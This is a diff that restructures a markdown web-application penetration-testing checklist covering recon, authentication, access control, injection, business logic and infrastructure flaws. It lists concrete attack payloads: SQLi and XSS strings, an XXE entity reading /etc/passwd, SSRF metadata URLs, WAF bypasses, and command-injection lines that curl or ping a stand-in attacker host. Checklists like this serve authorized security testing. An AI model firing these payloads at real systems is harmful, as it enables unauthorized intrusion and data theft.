@@ -1,244 +1,338 @@
+---
+title: Web Application Testing
+tags:
+  - methodology
+  - pentest
+  - web
+---
 
-# Sanity checks 
+Structured approach to web application penetration testing. Ordered by signal strength -- test what's most likely to yield critical findings first, eliminate noise last.
 
-#### Fuzzing
+## Testing Order
 
-* [ ] Fuzz all endpoints (API, directories, internal addresses, file extensions…)
-  * [ ] If an API is like `/api/v1/my-profile` , don’t forget to also fuzz `/api/FUZZ/my-profile`
-* [ ] robots.txt
-* [ ] Also look for .php, .html, .txt,…
-* [ ] Check for WAF  `wafw00f <URL>` .
-* [ ] Overexposure from endpoints (returning too much data).
-
-#### SQLi
-
-* [ ] Test `‘` and `“` and nothing.
-* [ ] Test with `ORDER BY 1-20 -- -` to figure out the number of returned columns
-* [ ] Test with `UNION SELECT null, null, ...`
-* [ ] Test with `UNION SELECT 1,2,3, ...`&#x20;
-* [ ] Test previous 3 and without URL encoding ( `+` and `%20` are NOT the same)
-* [ ] Test with SQLMap.
-* [ ] Test for login bypass with `' and 1=1-- -`
-* [ ] Test for blind SQLi.
-* [ ] Test for second-order SQLi.
-* [ ] Test for NoSQLi
-  * [ ] Different operators: `$eq, $ne, $gt, $gte, $lt, $lte`
-  * [ ] Test for login bypass: `{"username": "anyname", "password": {"$ne": ""}}`
-  * [ ] Test for id bypass: `http://localhost/v1/api?id[$ne]=null`
-
-#### XSS
-
-* [ ] Is your input reflected in the response?
-* [ ] Can we use events (onload, onerror)?
-* [ ] Is your input stored and later rendered?
-* [ ] Fuzz for tags and attributes that are allowed.
-* [ ] Is there a `href`attribute that can be misused? (`javascript:alert()` )
-* [ ] Do you see `document.script`inside the codebase?
-* [ ] Do you see `script`tags in the response?
-* [ ] Can you inject a `<base href>` tag to change how relative URLs resolve?
-* [ ] Can you make the payload bigger by adding 10.000 characters? (WAF evasion)
-* [ ] Can you add special characters and see if they’re filtered? (`”’testing§&%*;#{}`)
-* [ ] If filtered, does `<scrscriptipt>prompt()</scriscriptpt>` work?
-
-#### File Inclusion
-
-* [ ] Make sure Burp Suite has turned of the filter for CSS and images.
-* [ ] Test for LFI
-  * [ ] Can you access local files (../../../etc/passwd).
-  * [ ] Test with obfuscation (….//….//….//etc/passwd).
-  * [ ] Test for null byte injection (../../../etc/passwd%00).
-  * [ ] Test for protocol wrappers (php\://, data://).
-* [ ] Test for RFI
-  * [ ] Can you include remote files (<http://hacker.com/malicious.php>)
-  * [ ] Test with obfuscation (hthttptp\://hacker.com/malicious.php)
-* [ ] Can you achieve RCE?
-  * [ ] Going to a php file you uploaded?
-* [ ] Is a part of the path ‘obligated’? (e.g. `var/www/html/../../../etc/passwd` )
-
-#### XXE
-
-* [ ] Identify endpoints that can process XML.
-* [ ] Identify endpoints that accept SVG or DOCX.
-* [ ] Try an XInclude attack.
-* [ ] If XXE is possible, check for opportunities to perform SSRF.
-
-#### Attacking authentication
-
-* [ ] Can we enumerate usernames
-  * [ ] Difference in response time with a user we know exists and one we know does not exist.
-    * [ ] `select * from users where username = 'idpnt' union select 1 as id, 'alice' as username, '123' as password`
-  * [ ] Difference in response time with large passwords on login
-  * [ ] Slight differences in response length
-  * [ ] Use an full exact fail message as a reverse search
-  * [ ] Registering a username that we know exists
-* [ ] Check password reset
-* [ ] Check keep logged in functionality
-* [ ] Test for brute force protection
-  * [ ] Can we spoof headers (X-Real-IP, X-Forwarded-For, X-Originating-IP, Client-IP, True-Client-IP)
-* [ ] Check for MFA
-  * [ ] Check if token can be brute forced
-  * [ ] Try SQLi on MFA token
-  * [ ] Can you force the endpoint you want to reach by skipping some steps. (e.g go to (user-dashboard after logging in but before entering a MFA)
-  * [ ] Check if the MFA works on different users.
-* [ ] Default credentials
-* [ ] Check tokens
-  * [ ] Sequencer for predictability
-  * [ ] Signature on JWT
-    * [ ] Is it possible to send an unsigned token?
-    * [ ] Signature “none” attack.
-    * [ ] Is it possible to crack the signature with hashcat or jwt\_tool?
-
-#### Command injection
-
-* [ ] Test for simple injections with ;, &&, || and |.
-* [ ] Test for blind injection. Use ping or curl.
-* [ ] Test with a list of potentially dangerous functions/methods (like exec(), system(), passthru() in PHP, or exec, eval in Node.js).
-
-#### SSTI
-
-* [ ] Is a input reflected on the response?
-* [ ] If the payload is not working on the frontend, make sure to check also the response in Burp.
-
-#### CSRF
-
-* [ ] Does every form has a CSRF token?
-* [ ] Test with a random token
-* [ ] Can we use GET instead of POST (can our payload be in the URI instead of the body)?
-
-#### SSRF
-
-* [ ] Identify all points where the application makes a server-side HTTP request (body, headers, parameters).
-* [ ] Does the application accept IP addresses or localhost as hostname?
-* [ ] Map out internal endpoints (fuzzing).
-* [ ] Alternative IP notation (e.g. 127.0.0.1 in hex is 0x7f.0x0.0x0.0x1).
-
-#### Insecure File Upload
-
-* [ ] Are there file type restrictions?
-* [ ] Test for bypassing file extension filters (.phtml, php5)
-* [ ] Upload a file with double extension (.jpg.php)
-* [ ] Test for malicious content inside a file (XXE inside a XML upload).
-* [ ] Are the uploaded files accessible trough an URL?
-* [ ] Can others access the uploaded files?
-
-#### Broken Access Control
-
-* [ ] Check for ID’s inside requests.
-* [ ] Forceful browsing (go straight to /admin)
-* [ ] Can we perform actions on pages we were not supposed to reach? (/admin is protected, but /admin-roles is not)
-* [ ] Check if you can use functionality that’s not inside your authorization?
-  * [ ] Change a GET request to a PUT and try changing it values that it returns. (eg, use a PUT on a GET userStat and change the stats of a different user)
-  * [ ] Can you change the ID on a DELETE endpoint so you end up deleting a post you’re not supposed to?
-* [ ] Decode tokens and see if you can change them.
-
-#### JWT
-
-* [ ] Can you use the request without the token?
-* [ ] Can you use a unsigned token?
-* [ ] Can you change the payload (different user)?
-* [ ] Is signature ‘none’ attack possible?
-* [ ] Can you crack the token itself (hashcat or jwt\_tool)?
-* [ ] Can you use header injection?
-* [ ] Analyse JWT with jwt\_tool.
-* [ ] Can you use a JWT of a low level user to perform high level actions?
-
-#### Token
-
-* [ ] Is the token Base64?
-* [ ] Can Sequencer do an analysis (don’t forget to enable base64-decode before analyzing if applicable)
-* [ ] Can you forge a token on basis of Sequencer results?
-
-#### Websockets
-
-* [ ] Check in response for `upgrade: Websocket`
-* [ ] WebSocket Hijacking
-  * [ ] Handshake relies on cookies.
-  * [ ] No CSRF token.
-  * [ ] Same site cookie is ‘None’.
-
-#### Mass assignment
-
-* [ ] Check for leaky endpoints.
-* [ ] Check JWT (eg `“role”:”admin”`).
-* [ ] Code review (spread operators).
-
-#### Open Redirect
-
-* [ ] check frontend code for redirects (on click —> location.href).
-* [ ] check URL for a redirect.
-
-#### Race conditions
-
-* [ ] Is there a multi-step process (so you can hammer step 2)?
-* [ ] Check if a duplicate action is allowed (apply, redeem, confirm,…)
-* [ ] Are there coupon, voucher, gift-card redeem endpoints?
-* [ ] Is there a reset email functionality?
-
-#### API
-
-* [ ] Can you use other HTTP methods?
-* [ ] Fuzz the APIs (eg if there is `api/v1/checkout` check if there is `api/v2/checkout`, but don’t forget to check all the different parameters).
-
-#### Prototype Pollution
-
-* [ ] Can you change the objects’ parameter with `{"__proto__":{"isAdmin":true}}`
-* [ ] Can you change the URL parameter with `?__proto__[isAdmin]=true`
-  * [ ] If successful, create a payload and URL encode it.
-* [ ] Consult DOM Invader.
-* [ ] Use Burp extension for server-side pollution
-* [ ] Consider filters. `__pro__proto__to__` might work.
-* [ ] Look for `eval()` ,`document.createElement()` , `innerHTML`, `Object.assign()`
-* [ ] Look for URL parameters in the code.
-
-#### GraphQL
-
-* [ ] Fuzz the application to find extra endpoints, query or mutation fields.
-  * [ ] Use the endpoints list.
-  * [ ] Write down all mutation/queries and ask ChatGPT to make a list with potential hidden names.
-* [ ] Is Introspection possible?
-  * [ ] Put the introspection into <https://apis.guru/graphql-voyager/>.
-* [ ] Information Disclosure
-  * [ ] Can we query extra fields?
-  * [ ] Use field suggestion to discover more fields.
-  * [ ] Use field stuffing to discover more fields.
-* [ ] Batch attack possible?
-* [ ] Injection attacks, CSRF, IDOR, BAC, and other web attacks?
-
-#### WAF
-
-* [ ] Can you add a bunch of data before the payload?
-* [ ] Can you encode the payload?
-* [ ] Can you obfuscate the payload?
-
-#### Logic Flaws
-
-* [ ] Can you adjust things like a price/refund amount/points inside the post request?
-* [ ] Can you add multiple discount codes?
-
-
-
-```txt
-// Adding extra lines
-"delivery_address":"test",
-"phone":"123",
-"payment_method":"card",
-"notes":"",
-"discount":"PIZZA-10",
-"discount":"PIZZA-10",
-"discount":"PIZZA-10"
+```
+1. RECON         Endpoints, source maps, tech stack, signals
+2. AUTH          Login, registration, session management, JWT, MFA
+3. ACCESS        BAC, IDOR, privilege escalation, role matrix
+4. INJECTION     SQLi, XSS, SSTI, command injection, XXE
+5. LOGIC         Price manipulation, race conditions, state machines
+6. INFRASTRUCTURE   SSRF, cache deception, API gateway bypass, CORS
 ```
 
-```txt
-// Adding inside a array
-"delivery_address":"test",
-"phone":"123",
-"payment_method":"card",
-"notes":"",
-"discount":["PIZZA-10",
-"PIZZA-10",
-"PIZZA-10",
-"PIZZA-10",
-"PIZZA-10"
-]}
+Start at the top. Findings in one phase inform the next -- a weak JWT makes IDOR testing trivial, a user enumeration oracle makes brute force the priority.
+
+---
+
+## 1. Recon
+
+- [ ] Enumerate endpoints (API routes, directories, hidden paths)
+- [ ] If an API is `/api/v1/resource`, also fuzz `/api/FUZZ/resource` and `/api/v2/resource`
+- [ ] Extract source maps -- frontend source reveals API routes, validation logic, roles
+- [ ] Check robots.txt, sitemap.xml, .well-known/
+- [ ] Identify tech stack from headers, error pages, JS bundles
+- [ ] Check for WAF (`wafw00f`, or send `<script>` and observe response)
+- [ ] Look for overexposed endpoints returning more data than the UI shows
+- [ ] Check for different content types (.php, .html, .txt, .json, .xml)
+- [ ] Review JS for hardcoded API keys, internal endpoints, debug flags
+
+---
+
+## 2. Authentication & Session
+
+### Username Enumeration
+
+- [ ] Different error messages ("user not found" vs "wrong password")
+- [ ] Response time differences (known user triggers password hash comparison)
+- [ ] Response length differences (even 1 byte matters)
+- [ ] Registration endpoint reveals existing usernames
+- [ ] Password reset reveals valid emails
+
+### Brute Force
+
+- [ ] Test rate limiting (does it exist? per-IP? per-account? per-session?)
+- [ ] Header spoofing bypass: `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `True-Client-IP`
+- [ ] Account lockout threshold and reset behaviour
+- [ ] Credential stuffing with common passwords
+
+### JWT
+
+- [ ] Remove the token entirely -- does the request still work?
+- [ ] Signature `"alg": "none"` attack
+- [ ] Change payload claims (user ID, role, email)
+- [ ] Crack signature with hashcat/jwt_tool (weak secrets)
+- [ ] Algorithm confusion (RS256 -> HS256 with public key as secret)
+- [ ] `kid` header injection (path traversal, SQLi)
+- [ ] `jku`/`x5u` header pointing to attacker-controlled key
+- [ ] Use low-privilege JWT for high-privilege actions
+- [ ] Check token expiration -- does a revoked token still work?
+
+### MFA
+
+- [ ] Can the MFA step be skipped by navigating directly to the post-auth page?
+- [ ] Is the MFA token brute-forceable (4-6 digits, no rate limit)?
+- [ ] Does the MFA token work for different users?
+- [ ] SQLi on the MFA verification parameter
+- [ ] Response manipulation (change `"success": false` to `true`)
+
+### Session Management
+
+- [ ] Token entropy -- use Burp Sequencer or collect samples manually
+- [ ] Are tokens predictable (sequential, timestamp-based, low entropy)?
+- [ ] Session fixation -- can you set a session token before authentication?
+- [ ] Does logout actually invalidate the token server-side?
+- [ ] Cookie flags: HttpOnly, Secure, SameSite
+
+### Password Reset
+
+- [ ] Is the reset token predictable?
+- [ ] Can you reset another user's password by changing the email/username parameter?
+- [ ] Host header injection to capture reset links
+- [ ] Does the reset token expire?
+- [ ] Can you reuse a reset token?
+
+---
+
+## 3. Access Control
+
+### Broken Access Control (BAC)
+
+- [ ] Access admin pages directly (forceful browsing)
+- [ ] Hidden admin paths: /admin, /administrator, /admin-panel, /management, /internal
+- [ ] If /admin is protected, check /admin-roles, /admin-settings, /admin-users
+- [ ] Change HTTP method (GET -> PUT/DELETE) on endpoints you can read but shouldn't write
+- [ ] Remove authorization header entirely -- what still works?
+- [ ] Use low-privilege token on high-privilege endpoints
+- [ ] Check every endpoint with: no auth, user A token, user B token, admin token
+
+### IDOR
+
+- [ ] Identify all ID parameters (path, query, body)
+- [ ] Change IDs to other users' resources
+- [ ] Try sequential IDs (id=1, id=2, id=3)
+- [ ] Try UUIDs from other users (leak via user profiles, comments, etc.)
+- [ ] Test WRITE before READ -- can you PUT/PATCH/DELETE another user's resource?
+- [ ] Check response bodies -- 200 with different data vs 200 with same data
+- [ ] Contagion: if IDOR works on /users/:id, test /orders/:id, /invoices/:id
+
+### Mass Assignment
+
+- [ ] Find endpoints that accept JSON objects (registration, profile update, settings)
+- [ ] Add fields from the response back into the request (role, isAdmin, verified, balance)
+- [ ] Check for spread operators in source code (`Object.assign`, `...req.body`)
+- [ ] Try nested objects: `{"user": {"role": "admin"}}`
+- [ ] Compare request fields vs response fields -- extra response fields are candidates
+
+---
+
+## 4. Injection
+
+### SQL Injection
+
+- [ ] Test single quote `'` and double quote `"` in all parameters
+- [ ] Test with and without URL encoding (`+` and `%20` are not the same)
+- [ ] `ORDER BY 1` through `ORDER BY 20` to find column count
+- [ ] `UNION SELECT null, null, ...` (match column count)
+- [ ] `UNION SELECT 1, 2, 3, ...` to find visible columns
+- [ ] Login bypass: `' OR 1=1-- -`, `admin'-- -`
+- [ ] Blind boolean: `' AND 1=1-- -` vs `' AND 1=2-- -` (response diff)
+- [ ] Blind time-based: `' AND SLEEP(5)-- -`
+- [ ] Error-based: `' AND extractvalue(1, concat(0x7e, version()))-- -`
+- [ ] Second-order: input stored then used in a later query
+- [ ] Filter bypass: case variation, comments (`SEL/**/ECT`), double encoding
+
+### NoSQL Injection
+
+- [ ] Operator injection: `{"username": "admin", "password": {"$ne": ""}}`
+- [ ] Query parameter: `?id[$ne]=null`, `?id[$gt]=""`
+- [ ] Operators: `$eq`, `$ne`, `$gt`, `$gte`, `$lt`, `$lte`, `$regex`, `$exists`
+- [ ] JavaScript injection: `$where: "this.password.match(/^a.*/)"`
+
+### XSS
+
+- [ ] Is input reflected in the response? Where? (HTML body, attribute, JS context, URL)
+- [ ] Context-aware payloads:
+  - HTML body: `<img src=x onerror=alert(1)>`
+  - Attribute: `" onmouseover="alert(1)`
+  - JavaScript: `';alert(1)//`
+  - URL/href: `javascript:alert(1)`
+- [ ] DOM sinks: innerHTML, document.write, eval -- use event handlers, NOT `<script>` tags
+- [ ] Fuzz for allowed tags and attributes when filtering exists
+- [ ] Stored XSS: input saved and rendered to other users
+- [ ] Filter bypass: `<scrscriptipt>`, double encoding, unicode, HTML entities
+- [ ] WAF bypass: payload padding (10,000+ chars before payload), case mixing
+- [ ] `<base href>` injection to hijack relative URLs
+- [ ] CSP bypass: check for unsafe-inline, wildcards, JSONP endpoints
+
+### SSTI (Server-Side Template Injection)
+
+- [ ] Test math expressions: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
+- [ ] If reflected as `49`, identify the engine (Jinja2, Twig, Freemarker, Velocity)
+- [ ] Escalate to RCE based on engine
+- [ ] Check response in proxy -- frontend may not render the result
+
+### Command Injection
+
+- [ ] Separators: `;`, `&&`, `||`, `|`, newline (`%0a`)
+- [ ] Blind: `; ping -c 5 attacker.com`, `; curl attacker.com`
+- [ ] Dangerous functions: exec(), system(), passthru() (PHP), child_process (Node.js)
+- [ ] Bypass filters: `c$()at /etc/passwd`, variable substitution, wildcards
+
+### XXE (XML External Entity)
+
+- [ ] Any endpoint accepting XML, SVG, DOCX, XLSX
+- [ ] Classic: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
+- [ ] Blind XXE with external DTD and out-of-band exfiltration
+- [ ] XInclude attack (when you control only part of the XML)
+- [ ] XXE -> SSRF: use entity to fetch internal URLs
+- [ ] Content-type switching: change `application/json` to `application/xml`
+
+---
+
+## 5. Business Logic
+
+### Price & Value Manipulation
+
+- [ ] Change price, quantity, discount values in POST/PUT requests
+- [ ] Negative quantities or negative prices
+- [ ] Integer overflow (very large numbers)
+- [ ] Apply discount codes multiple times (duplicate keys, arrays)
+- [ ] Change currency while keeping amount
+- [ ] Skip payment step entirely (navigate to confirmation)
+
+### Race Conditions
+
+- [ ] Multi-step processes: hammer step 2 before step 1 completes
+- [ ] Duplicate actions: redeem, apply, confirm, transfer, vote
+- [ ] Coupon/voucher/gift-card redemption
+- [ ] Account balance operations (withdraw more than available)
+- [ ] Single-packet attack: send 20-50 identical requests simultaneously
+- [ ] Check for TOCTOU (time-of-check vs time-of-use) on any stateful operation
+
+### State Machine Bypass
+
+- [ ] Skip steps in multi-step workflows (go from step 1 to step 4)
+- [ ] Replay earlier steps after later ones complete
+- [ ] Change state values: `status=pending` -> `status=approved`
+- [ ] Cancel after completion (refund after delivery)
+- [ ] Re-enter a flow that should be one-time (verification, onboarding)
+
+### Coupon/Discount Abuse
+
+```json
+// Duplicate keys
+{"discount":"CODE-10", "discount":"CODE-10", "discount":"CODE-10"}
+
+// Array injection
+{"discount":["CODE-10","CODE-10","CODE-10","CODE-10","CODE-10"]}
+
+// Apply to different items in same cart
+// Apply expired codes, apply codes from other users
 ```
 
+---
+
+## 6. Infrastructure
+
+### SSRF (Server-Side Request Forgery)
+
+- [ ] Find URL-accepting parameters (webhooks, avatars, imports, PDF generators, link previews)
+- [ ] Test localhost: `http://127.0.0.1`, `http://localhost`, `http://[::1]`
+- [ ] Internal ranges: `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`
+- [ ] Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS)
+- [ ] Alternative notation: decimal IP, hex IP, IPv6 mapped IPv4, DNS rebinding
+- [ ] Redirect bypass: use your server that 302s to internal address
+- [ ] Protocol switching: `file://`, `gopher://`, `dict://`
+- [ ] Partial SSRF: can you scan internal ports via timing/error differences?
+
+### CORS Misconfiguration
+
+- [ ] Send request with `Origin: https://evil.com` -- is it reflected in `Access-Control-Allow-Origin`?
+- [ ] Test `null` origin
+- [ ] Test subdomain: `Origin: https://evil.target.com`
+- [ ] Check if credentials are allowed (`Access-Control-Allow-Credentials: true`)
+- [ ] If origin is reflected + credentials allowed = full account takeover via CORS
+
+### Cache Deception
+
+- [ ] Append static extension to authenticated page: `/api/me/profile.css`
+- [ ] Path confusion: `/api/me/%2f..%2fstatic/style.css`
+- [ ] Request authenticated page, check if `X-Cache: HIT` appears on second request
+- [ ] If cached: access the same URL without authentication -- does it return cached authenticated content?
+
+### API Gateway Bypass
+
+- [ ] Path traversal: `/public/../admin/users`
+- [ ] Method override: `X-HTTP-Method-Override: DELETE` with a GET request
+- [ ] Version rollback: `/api/v1/admin` might have weaker controls than `/api/v2/admin`
+- [ ] Case sensitivity: `/Admin/Users` vs `/admin/users`
+- [ ] Trailing characters: `/admin/users..;/`, `/admin/users%00`
+- [ ] Double URL encoding: `%252e%252e%252f`
+
+### File Upload
+
+- [ ] Extension bypass: `.phtml`, `.php5`, `.pHp`, `.php.jpg`
+- [ ] Double extension: `.jpg.php`
+- [ ] Content-type mismatch: change header but keep malicious content
+- [ ] Null byte: `file.php%00.jpg`
+- [ ] Malicious content in allowed formats (XXE in SVG/DOCX, EXIF data in images)
+- [ ] Path traversal in filename: `../../../etc/cron.d/shell`
+- [ ] Are uploaded files accessible via URL? Can other users access them?
+
+### Open Redirect
+
+- [ ] Check URL parameters: `?redirect=`, `?next=`, `?url=`, `?return=`
+- [ ] Frontend: `location.href`, `window.location`, `document.location` with user input
+- [ ] Bypass filters: `//evil.com`, `\/\/evil.com`, `https://target.com@evil.com`
+- [ ] Use for: phishing, OAuth token theft, SSRF chain
+
+### CSRF
+
+- [ ] State-changing requests without CSRF token
+- [ ] Token present but not validated (random value accepted)
+- [ ] Token tied to session? (swap between users)
+- [ ] GET method accepted for state-changing actions (CSRF via image tag)
+- [ ] SameSite cookie attribute (None = vulnerable, Lax/Strict = harder)
+
+### WebSocket
+
+- [ ] Check for `Upgrade: WebSocket` in responses
+- [ ] Cross-Site WebSocket Hijacking (CSWSH):
+  - Handshake relies on cookies only (no CSRF token)
+  - SameSite=None on session cookie
+- [ ] Message injection / manipulation
+- [ ] Check if authentication is validated on each message or just on connect
+
+### Prototype Pollution
+
+- [ ] JSON body: `{"__proto__": {"isAdmin": true}}`
+- [ ] Query string: `?__proto__[isAdmin]=true`
+- [ ] Constructor: `{"constructor": {"prototype": {"isAdmin": true}}}`
+- [ ] Filter bypass: `__pro__proto__to__`
+- [ ] Look for sinks: `eval()`, `document.createElement()`, `innerHTML`, `Object.assign()`
+- [ ] Server-side: use Burp extension or test for property reflection in responses
+- [ ] DOM-based: use DOM Invader in Burp's embedded browser
+
+### GraphQL
+
+- [ ] Introspection: `{__schema{types{name,fields{name}}}}`
+- [ ] If introspection disabled: field suggestion, field stuffing, error-based discovery
+- [ ] Batch queries: send multiple operations in one request
+- [ ] Depth/complexity attacks (nested queries for DoS)
+- [ ] Mutation discovery: fuzz for hidden mutations
+- [ ] Alias-based brute force (multiple queries in one request)
+- [ ] Standard web vulns still apply: injection, IDOR, BAC on all fields
+
+---
+
+## WAF Bypass Techniques
+
+When a WAF blocks your payload:
+
+- [ ] Payload padding: 10,000+ characters before the actual payload
+- [ ] Encoding: double URL encoding, unicode, HTML entities, hex
+- [ ] Case mixing: `SeLeCt`, `<ScRiPt>`
+- [ ] Comment insertion: `SEL/**/ECT`, `UN/**/ION`
+- [ ] HTTP parameter pollution: same param multiple times
+- [ ] Content-type switching: `application/json` to `application/x-www-form-urlencoded`
+- [ ] Chunked transfer encoding
+- [ ] After 3 failed bypass attempts on the same endpoint: move on. Don't rabbit-hole.
